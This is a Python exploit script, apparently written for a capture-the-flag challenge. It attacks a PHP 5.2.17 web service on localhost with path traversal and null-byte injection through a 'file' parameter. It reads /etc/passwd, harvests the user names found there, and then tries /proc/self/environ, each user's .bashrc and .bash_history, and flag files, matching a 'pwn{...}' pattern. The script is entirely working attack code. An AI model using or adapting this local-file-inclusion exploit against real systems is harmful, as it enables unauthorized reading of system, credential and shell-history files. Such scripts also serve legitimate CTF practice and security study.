#!/usr/bin/env python3
import requests
import re

URL = "http://localhost:1337"

def exploit():
    print(f"[*] Target: {URL}")
    print("[*] Detected PHP 5.2.17 -> Using Null Byte Injection (%00)")
    
    # Karakter Null Byte untuk memotong ekstensi .mp4
    null_byte = '\x00' 
    
    # 1. Cek User via /etc/passwd
    print("\n[*] Checking /etc/passwd...")
    payload_passwd = f"../../../../etc/passwd{null_byte}"
    
    users = []
    
    try:
        r = requests.get(URL, params={'file': payload_passwd})
        
        if "root:x:0:0" in r.text:
            print("[+] /etc/passwd FOUND!")
            # Parsing user biasa
            for line in r.text.splitlines():
                if "sh" in line and "root" not in line and "www-data" not in line:
                    parts = line.split(':')
                    if len(parts) > 0:
                        users.append(parts[0])
            print(f"[+] Detected users: {users}")
        else:
            print("[-] Failed to read /etc/passwd (Null Byte might be filtered or WAF?)")
            print(r.text[:200])

        # 2. List Target Files
        files_to_check = [
            "/proc/self/environ",  # Target utama flag di env
            "/flag", 
            "/flag.txt"
        ]
        
        # Tambahin target home directory user yang ketemu
        for user in users:
            files_to_check.append(f"/home/{user}/.bashrc")
            files_to_check.append(f"/home/{user}/.bash_history")
            files_to_check.append(f"/home/{user}/flag.txt")
            files_to_check.append(f"/home/{user}/flag")

        # 3. Eksekusi Attack
        for filename in files_to_check:
            # Payload: Path + Null Byte
            payload = f"../../../../{filename}{null_byte}"
            
            print(f"[*] Trying: {filename}...", end="\r")
            
            r = requests.get(URL, params={'file': payload})
            
            # Cek konten
            content = r.text
            
            # Bersihin output HTML dari <pre> kalau ada, atau raw
            if "<pre>" in content:
                match = re.search(r'<pre>(.*?)</pre>', content, re.DOTALL)
                if match:
                    content = match.group(1)
            
            # Indikator sukses
            if "File not found." not in content and len(content) > 0:
                # Cek Flag Pattern
                flag = re.search(r'pwn\{.*?\}', content)
                
                if flag:
                    print(f"\n[+] FILE FOUND: {filename}")
                    print("-" * 40)
                    print(f"\n[!!!] JACKPOT! FLAG: {flag.group(0)}\n")
                    return
                # Cek Environ Var Pattern
                elif "PWN=" in content or "FLAG=" in content:
                    print(f"\n[+] FILE FOUND: {filename}")
                    print("-" * 40)
                    # Replace null byte display buat environ
                    print(content.replace('\u0000', '\n').strip())
                    print("-" * 40)
                    
                    # Manual cek flag di output environ
                    flag_manual = re.search(r'pwn\{.*?\}', content)
                    if flag_manual:
                         print(f"\n[!!!] JACKPOT! FLAG: {flag_manual.group(0)}\n")
                         return

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()
